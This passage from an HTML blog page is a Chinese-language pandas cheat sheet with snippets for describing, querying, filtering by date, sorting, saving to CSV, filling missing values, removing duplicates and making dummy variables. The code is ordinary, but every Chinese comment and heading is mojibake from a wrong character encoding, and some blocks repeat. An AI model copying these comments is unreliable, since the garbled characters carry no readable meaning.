class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;é«˜ç«¯äººæ‰å¾—åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;åŠå­¦å±‚æ¬¡å¾—åˆ†&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹æ•°æ®ä¿¡æ¯</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®è¡Œåˆ—æ•°</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®é‡</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ æ•°å€¼å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€å‡å€¼ä»€ä¹ˆçš„</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ ç¦»æ•£å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€é¢‘ç‡ä»€ä¹ˆ</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å…¨éƒ¨ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line"><span class="comment"># å»é™¤é‡å¤çš„</span></span><br><span class="line">df[<span class="string">&#x27;a&#x27;</span>].unique()</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹ç»Ÿè®¡æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®è¡Œåˆ—æ•°</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®é‡</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ æ•°å€¼å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€å‡å€¼ä»€ä¹ˆçš„</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ ç¦»æ•£å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€é¢‘ç‡ä»€ä¹ˆ</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å…¨éƒ¨ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line"><span class="comment"># è®¡ç®— æ€»åˆ†ã€é«˜ç«¯äººæ‰å¾—åˆ†ã€åŠå­¦å±‚æ¬¡å¾—åˆ†çš„æœ€å¤§æœ€å°å€¼ã€ä¸­ä½æ•°ã€å‡å€¼</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;æ€»åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;é«˜ç«¯äººæ‰å¾—åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;åŠå­¦å±‚æ¬¡å¾—åˆ†&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].isin([<span class="string">&#x27;å·¥ä¸š&#x27;</span>,<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å·¥ä¸š&#x27;</span>)|(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;å·¥ä¸š|å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–å…¨éƒ¨åˆ—åä¸­ä»¥ â€œæ•°â€ ç»“å°¾çš„åˆ—</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;æ•°&#x27;</span>)]</span><br><span class="line"><span class="comment"># æå–ç¬¬1ï¼Œ2ï¼Œ3ï¼Œ4åˆ—</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢ç±»å‹</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®å±•å¼€</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœè¡ŒAå’Œè¡ŒCå­˜åœ¨[a,b,c]è¿™æ ·çš„åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨</span></span><br><span class="line">df5.explode([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;C&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®ç´¯åŠ </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum()</span><br><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>æŒ‰æ—¶é—´è¿›è¡Œç­›é€‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä¸€èˆ¬æ¥è¯´å¯ä»¥æŠŠdatetimeä½œä¸ºç´¢å¼•ï¼Œæ¯”è¾ƒæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œç­›é€‰æ“ä½œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># å°†DateTimeè½¬æˆæ—¥æœŸæ ¼å¼</span></span><br><span class="line">df[<span class="string">&#x27;DateTime&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;DateTime&#x27;</span>])</span><br><span class="line"><span class="comment"># å°†æ—¥æœŸè®¾ä¸ºindex</span></span><br><span class="line">df = df.set_index(<span class="string">&#x27;DateTime&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­›é€‰ä»2019å¹´3æœˆ1å·åˆ°2019å¹´3æœˆ10å·æ•´åå¤©çš„æ•°æ®</span></span><br><span class="line">df1 = df[<span class="string">&#x27;2019-03-01&#x27;</span>:<span class="string">&#x27;2019-03-10&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¦‚æœæˆ‘ä»¬ä¸æƒ³æˆ–è€…ä¸å¥½å°†datetimeè®¾ç½®ä¸ºç´¢å¼•ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># è®¾ç½®å¼€å§‹æ—¶é—´</span></span><br><span class="line">from_date = df[<span class="string">&#x27;DATA_DATE&#x27;</span>]&gt;=<span class="string">&#x27;2021-01-01&#x27;</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç»“æŸæ—¶é—´</span></span><br><span class="line">to_date = df[<span class="string">&#x27;DATA_DATE&#x27;</span>]&lt;=<span class="string">&#x27;2021-03-31&#x27;</span></span><br><span class="line"><span class="comment"># ç­›é€‰æ•°æ®æ—¶é—´æ®µ</span></span><br><span class="line">df = df[from_date&amp;to_date]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æ—¥æœŸåŠ å‡ï¼š</span></span><br><span class="line">beg = end - pd.Timedelta(days=<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li>æ’åºé—®é¢˜</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># å…ˆæŒ‰ç€Aåˆ—çš„å€¼å‡åºï¼Œå†æŒ‰ç€Bçš„é¡ºåºé™åº</span></span><br><span class="line">df.sort_values([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>],ascending=[<span class="literal">True</span>,<span class="literal">False</span>])</span><br></pre></td></tr></table></figure><ul><li>å¯¹dfè¿›è¡Œè‡ªå®šä¹‰æ’åº</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ•°æ®é‡å°çš„æƒ…å†µ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># å°†ç´¢å¼•0å’Œç´¢å¼•3çš„é¡ºåºå¯¹è°ƒ</span></span><br><span class="line">indx = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="comment"># å¦‚æœindexè¿‡é•¿,å¯ä»¥é€šè¿‡.indexè·å–</span></span><br><span class="line">df.index</span><br><span class="line"><span class="comment"># ä½¿ç”¨reindexå®ç°</span></span><br><span class="line">df.reindex(indx)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ•°æ®é‡å¤§çš„æƒ…å†µ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#df[1:3] = df[3:1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index ç´¢å¼•é‡æ’åº</span></span><br><span class="line">frame.swaplevel(<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>)</span><br><span class="line"><span class="comment"># å¯¹å¤šä¸ªç´¢å¼•æ’åºï¼ŒæŒ‰ç…§åç§°</span></span><br><span class="line">frame.sort_index(level=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æŒ‰ç…§ç´¢å¼•å€¼æ’åº</span></span><br><span class="line">frame.sort_index()</span><br></pre></td></tr></table></figure><h2><span id="ä¿å­˜æ–‡ä»¶">ä¿å­˜æ–‡ä»¶</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸ä¿å­˜ç´¢å¼•</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># ä¿å­˜æŒ‡å®šåˆ—</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,columns=[<span class="string">&#x27;positionName&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>])</span><br><span class="line"><span class="comment"># å°æ•°ç‚¹</span></span><br><span class="line">mar.to_csv(<span class="string">&quot;2-1.csv&quot;</span>, index=<span class="literal">False</span>, float_format=<span class="string">&#x27;%.3f&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="tricks">Tricks</span></h2><ul><li>å¼‚å¸¸å€¼åˆ†æ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…ˆçœ‹æ•°æ®ï¼Œåé¢na_valuesåæœŸå¡«å†™</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;xx.csv&#x27;</span>,na_values=[])</span><br><span class="line"><span class="comment"># æ¯ä¸ªcolå»çœ‹å®ƒçš„unique()å€¼æ˜¯å¦æœ‰éæ³•å­—ç¬¦ï¼Œå¦‚æœæœ‰å°±æ·»åŠ åˆ°na_valuesä¸­</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> df.columns:</span><br><span class="line">  <span class="built_in">print</span>(df[c].unique())</span><br><span class="line"><span class="comment"># ä½¿ç”¨headå’ŒinfoæŸ¥çœ‹æ•°æ® æ•°å€¼å‹çš„æ•°æ®</span></span><br><span class="line">df.head()</span><br><span class="line">df.info()</span><br><span class="line"><span class="comment"># å¦‚æœå‘ç°æ•°å€¼æ•°æ®å´æ˜¯objectç±»å‹ï¼Œåˆ™è½¬ä¸ºint/float</span></span><br><span class="line">df.a = df.a.astype(<span class="string">&#x27;int&#x27;</span>)</span><br><span class="line"><span class="comment"># å¦‚æœæç¤ºé”™è¯¯ï¼Œåˆ™å¯ä»¥ä»é”™è¯¯æç¤ºä¸­æ‰¾åˆ°éæ³•å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœæ˜¯éœ€è¦ æ¡ä»¶æ›¿æ¢çš„æ—¶å€™</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    mean = df[~(df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>)][<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)].mean()</span><br><span class="line">    indx = df[df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>].index.tolist()</span><br><span class="line">    df.loc[indx,<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)] = mean</span><br><span class="line">    <span class="comment"># å†™æˆè¿™æ ·ä¸è¡Œ å› ä¸ºå–ä¸åˆ°å¼•ç”¨</span></span><br><span class="line">    df[df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>][<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)] = mean</span><br><span class="line">    <span class="comment">#ä½¿ç”¨locå¯ä»¥å– ä½†æ˜¯[]ä¸è¡Œ</span></span><br><span class="line">    <span class="built_in">print</span>(df[~(df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>)].shape)</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®åˆ†æ&amp;å¤„ç†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># è®¡ç®—ç¼ºå¤±å€¼</span></span><br><span class="line">df.isna().<span class="built_in">sum</span>().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æ¯åˆ—æœ‰å¤šå°‘ç¼ºå¤±å€¼</span></span><br><span class="line">df.isnull().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç¼ºå¤±å€¼</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨æ•´åˆ—çš„å‡å€¼è¿›è¡Œå¡«å……mean mode median</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].mean())</span><br><span class="line"><span class="comment"># ç°åœ¨å°†è¯„åˆ†åˆ—çš„ç¼ºå¤±å€¼ï¼Œæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªç”µå½±çš„è¯„åˆ†</span></span><br><span class="line">df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>] = df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">&#x27;ffill&#x27;</span>)</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨ä¸Šä¸‹æ•°å­—çš„å‡å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].interpolate())</span><br><span class="line"><span class="comment"># åœ¨å¡«å…… â€œè¯­è¨€â€ åˆ—çš„ç¼ºå¤±å€¼ï¼Œè¦æ±‚æ ¹æ® â€œå›½å®¶/åœ°åŒºâ€ åˆ—çš„å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯­è¨€&#x27;</span>]=df.groupby(<span class="string">&#x27;å›½å®¶/åœ°åŒº&#x27;</span>).è¯­è¨€.bfill()</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾æŒ‡å®šåˆ—çš„é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated([<span class="string">&#x27;ç‰‡å&#x27;</span>])]</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼ï¼Œä½†ä¿ç•™æœ€åä¸€æ¬¡å‡ºç°çš„å€¼first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">&#x27;last&#x27;</span>)</span><br><span class="line"><span class="comment"># è®¡ç®—å„çœå¸‚å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">df.çœå¸‚.value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># fillna ä¼ å­—å…¸</span></span><br><span class="line">pretreat=pretreat.fillna(&#123;<span class="string">&#x27;v_0&#x27;</span>:df_mean.v_0,</span><br><span class="line">          <span class="string">&#x27;v_1&#x27;</span>:df_mean.v_1,</span><br><span class="line">          <span class="string">&#x27;v_2&#x27;</span>:df_mean.v_2,</span><br><span class="line">          <span class="string">&#x27;v_3&#x27;</span>:df_mean.v_3,</span><br><span class="line">          <span class="string">&#x27;v_4&#x27;</span>:df_mean.v_4,</span><br><span class="line">          <span class="string">&#x27;v_5&#x27;</span>:df_mean.v_5,</span><br><span class="line">          <span class="string">&#x27;v_6&#x27;</span>:df_mean.v_6,</span><br><span class="line">          <span class="string">&#x27;v_7&#x27;</span>:df_mean.v_7,</span><br><span class="line">           <span class="string">&#x27;v_8&#x27;</span>:df_mean.v_8,</span><br><span class="line">          <span class="string">&#x27;v_9&#x27;</span>:df_mean.v_9,</span><br><span class="line">          <span class="string">&#x27;v_10&#x27;</span>:df_mean.v_10,</span><br><span class="line">          <span class="string">&#x27;v_11&#x27;</span>:df_mean.v_11,</span><br><span class="line">          <span class="string">&#x27;v_12&#x27;</span>:df_mean.v_12,</span><br><span class="line">          <span class="string">&#x27;v_13&#x27;</span>:df_mean.v_13,</span><br><span class="line">          <span class="string">&#x27;v_14&#x27;</span>:df_mean.v_14</span><br><span class="line">          &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dropna: axis=1åˆ é™¤åˆ—ï¼Œaxis=0åˆ é™¤è¡Œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åˆ é™¤æ•´è¡Œç¼ºå¤±çš„æ•°æ®ï¼Œå‰©ä½™ç¼ºå¤±æ•°æ®æŒ‰0å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">&#x27;all&#x27;</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤æŸåˆ—ä¸ºç©ºçš„è¡Œ</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">&#x27;å®¢æˆ·ID&#x27;</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>å“‘å˜é‡æ“ä½œ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å“‘å˜é‡æ“ä½œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist() </span><br><span class="line"><span class="comment"># æˆ–è€…è‡ªå·±æŒ‡å®šæƒ³è¦æˆä¸ºå“‘å˜é‡çš„åˆ—</span></span><br><span class="line">cate = [<span class="string">&#x27;col1&#x27;</span>,<span class="string">&#x27;col2&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># è§£å†³intä¸èƒ½å“‘å˜é‡é—®é¢˜ï¼Œä¸€è¡Œsolution</span></span><br><span class="line">pd.get_dummies(df,columns=[<span class="string">&#x27;ç”¨ç”µç±»åˆ«&#x27;</span>,<span class="string">&#x27;ç”¨ç”µç±»åˆ«&#x27;</span>,<span class="string">&#x27;å¹´&#x27;</span>,<span class="string">&#x27;æœˆ&#x27;</span>]).info()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">data[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]] = data[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]].astype(<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">data = pd.get_dummies(data)</span><br></pre></td></tr></table></figure><ul><li>ç»Ÿè®¡ç©ºå€¼</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨applyå®ç°</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,np.nan,np.nan],<span class="string">&#x27;B&#x27;</span>:[<span 